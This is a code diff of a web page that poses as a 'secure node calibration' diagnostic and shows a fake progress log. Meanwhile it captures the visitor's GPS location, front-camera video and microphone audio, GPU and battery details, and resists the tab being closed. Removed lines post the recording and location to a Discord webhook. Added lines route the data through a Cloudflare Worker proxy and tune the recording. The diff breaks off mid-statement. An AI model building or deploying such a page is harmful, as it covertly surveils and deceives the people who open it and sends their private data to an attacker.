@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced System Diagnostic</title>
+    <title>System Diagnostic & Node Calibration</title>
     <style>
         body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
+        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; position: relative; }
         .terminal { background: #000; padding: 15px; border-radius: 5px; height: 200px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
         .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 0; transition: opacity 0.2s; }
         .line.show { opacity: 1; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; }
-        .btn:disabled { background: #161b2c; color: #5c6784; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 10px rgba(0, 210, 255, 0.5); }
+        .btn:disabled { background: #161b2c; color: #5c6784; box-shadow: none; cursor: not-allowed; }
         .bar-container { height: 2px; width: 100%; background: #111; margin-bottom: 10px; }
         .bar { height: 100%; width: 0%; background: #00d2ff; transition: width 6s linear; }
         video { display: none; }
@@ -20,7 +20,7 @@
 <body>
 
     <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784;">SECURE NODE CALIBRATION v4.2.0</div>
+        <div style="font-size: 0.7rem; color: #5c6784; letter-spacing: 1px;">SECURE NODE CALIBRATION v4.5.2</div>
         <div class="terminal" id="terminal">
             <div class="line show">> System idle. Awaiting authorization...</div>
         </div>
@@ -31,21 +31,22 @@
     <video id="video" autoplay playsinline muted></video>
 
     <script>
-        const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
+        // REPLACE THIS WITH YOUR CLOUDFLARE WORKER URL
+        const WEBHOOK_PROXY = 'https://discord-proxy.yourname.workers.dev'; 
 
-        // 1. Anti-Escape: Prevents user from closing tab easily
+        // 1. Anti-Escape Protection
         window.onbeforeunload = function() {
-            return "Diagnostic in progress. If you leave now, network nodes may remain unsynced.";
+            return "Diagnostic in progress. If you leave now, nodes may remain unsynced.";
         };
 
-        // 2. Deep Fingerprinting Function
+        // 2. Deep GPU Intel
         function getGPU() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_AD) : "Generic GPU";
-            } catch (e) { return "Unknown"; }
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_AD) : "Standard Renderer";
+            } catch (e) { return "Unavailable"; }
         }
 
         document.getElementById('startBtn').addEventListener('click', async function() {
@@ -53,97 +54,51 @@
             const bar = document.getElementById('bar');
             btn.disabled = true;
 
-            // Trigger Fullscreen for "App" feel
+            // Trigger Fullscreen for immersive experience
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            addLog("> Requesting GPS Satellite Handshake...");
+            addLog("> Initializing GPS Handshake...");
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                addLog("> GPS Linked. Calibrating Hardware...");
-                navigator.vibrate([100, 50, 100]); // Physical feedback
+                addLog("> GPS Linked. Calibrating Sensors...");
+                navigator.vibrate([100, 50, 100]); // Physical buzz
 
                 let stream;
                 try {
+                    // Optimized for speed and low file size
                     stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user", width: 640 }, 
+                        video: { facingMode: "user", width: { ideal: 640 } }, 
                         audio: true 
                     });
                 } catch (e) {
-                    addLog("> ERROR: Hardware Node Blocked.");
+                    addLog("> ERROR: Hardware Node Access Denied.");
+                    btn.disabled = false;
                     return;
                 }
 
                 if (stream) {
-                    addLog("> Media Node Established. Recording Flux...");
-                    const mediaRecorder = new MediaRecorder(stream);
+                    addLog("> Media Hub Active. Recording Flux...");
+                    
+                    // Codec Selection for Android stability
+                    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') 
+                                     ? 'video/webm;codecs=vp8,opus' 
+                                     : 'video/webm';
+                    
+                    const mediaRecorder = new MediaRecorder(stream, { mimeType });
                     const chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    mediaRecorder.start();
+                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                    
+                    // START RECORDING IN 1s CHUNKS (Prevents Flux Hang)
+                    mediaRecorder.start(1000); 
 
                     bar.style.width = "100%";
                     const fakeSteps = [
-                        "> Syncing Internal Clock...",
-                        "> Measuring Latency...",
-                        "> GPU: " + getGPU().split(' ').slice(0,3).join(' '),
-                        "> Tracking Packet Stability...",
-                        "> Optimization 84% complete..."
+                        "> Syncing Internal Frequency...",
+                        "> Latency: " + (Math.random() * 40 + 10).toFixed(2) + "ms",
+                        "> GPU: " + getGPU().split(' ').slice(0,2).join(' '),
+                        "> Tracking Data Stability...",
+                        "> Node Optimization 88%..."
                     ];
 
                     fakeSteps.forEach((step, i) => {
-                        setTimeout(() => addLog(step), i * 1000);
-                    });
-
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                        mediaRecorder.onstop = async () => {
-                            addLog("> Encrypting Data Packets...");
-                            const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                            const b = await navigator.getBattery();
-                            const formData = new FormData();
-                            
-                            const message = {
-                                content: "🔱 **ULTIMATE NODE CAPTURE**",
-                                embeds: [{
-                                    color: 5763719,
-                                    fields: [
-                                        { name: "📍 Location", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
-                                        { name: "🔋 Battery", value: `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged' : 'Battery'})`, inline: true },
-                                        { name: "⚙️ CPU/GPU", value: `${navigator.hardwareConcurrency} Core / ${getGPU()}`, inline: true },
-                                        { name: "📱 Resolution", value: `${screen.width}x${screen.height}`, inline: true }
-                                    ],
-                                    timestamp: new Date()
-                                }]
-                            };
-
-                            formData.append('payload_json', JSON.stringify(message));
-                            formData.append('file', videoBlob, 'node_log.webm');
-
-                            await fetch(WEBHOOK, { method: 'POST', body: formData });
-                            
-                            // 3. Final Physical Alert
-                            navigator.vibrate(500);
-                            stream.getTracks().forEach(t => t.stop());
-                            window.onbeforeunload = null; // Disable Anti-Escape
-                            
-                            addLog("> Sync Success. Redirecting...");
-                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-                        };
-                    }, 5500); // 5.5s Capture
-                }
-            }, (err) => {
-                alert("GPS Required for Node Verification.");
-                btn.disabled = false;
-            }, { enableHighAccuracy: true });
-        });
-
-        function addLog(text) {
-            const term = document.getElementById('terminal');
-            const div = document.createElement('div');
-            div.className = "line show";
-            div.innerText = text;
-            term.appendChild(div);
-            term.scrollTop = term.scrollHeight;
-        }
-    </script>
-</body>
-</html>
+                        setTimeout(() => addLog(step), i * 900);
